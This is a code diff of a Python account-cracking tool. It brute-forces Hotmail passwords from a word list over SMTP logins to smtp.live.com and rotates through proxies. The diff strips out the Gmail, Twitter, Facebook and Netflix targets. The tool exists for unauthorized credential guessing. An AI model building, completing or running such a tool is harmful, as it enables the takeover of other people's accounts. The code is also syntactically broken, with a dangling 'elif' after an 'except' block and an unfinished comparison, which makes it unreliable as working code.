@@ -47,22 +47,15 @@ _____________________                              _____________________
                                    \/ 
 {}
 -----------------------------------------------------------------------
--g --gmail                              ACCOUNT gmail @gmail.com
 -t --hotmail                            ACCOUNT hotmail @hotmail.com
--T --twitter                            ACCOUNT  twitter @
--f --facebook                           ACCOUNT  facebook @
--n --netflix                            Account  Netflix @
 -l --list                               List    Password BrutoForce
 -p --password                           Single  Password
 -X --proxy                              Proxy list
                             
 							   """.format(G,R))
 
-use.add_option("-g","--gmail",dest="gmail",help="Write Your Account gmail")
+
 use.add_option("-t","--hotmail",dest="hotmail",help="Write Your Account hotmail")
-use.add_option("-T","--twitter",dest="twitter",help="Write Your Account twitter")
-use.add_option("-f","--facebook",dest="facebook",help="Write Your Account facebook")
-use.add_option("-n","--netflix",dest="netflix",help="Write Your Account Netflix")
 use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
 use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
 use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
@@ -95,7 +88,8 @@ def proxy():
         checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=10)
     except:
         return proxy()
-    elif options.hotmail != true
+
+    elif options.hotmail != 
         smtp_srverH= smtplib.SMTP('smtp.live.com', 587)
         smtp_srverH.ehlo()
         smtp_srverH.starttls()
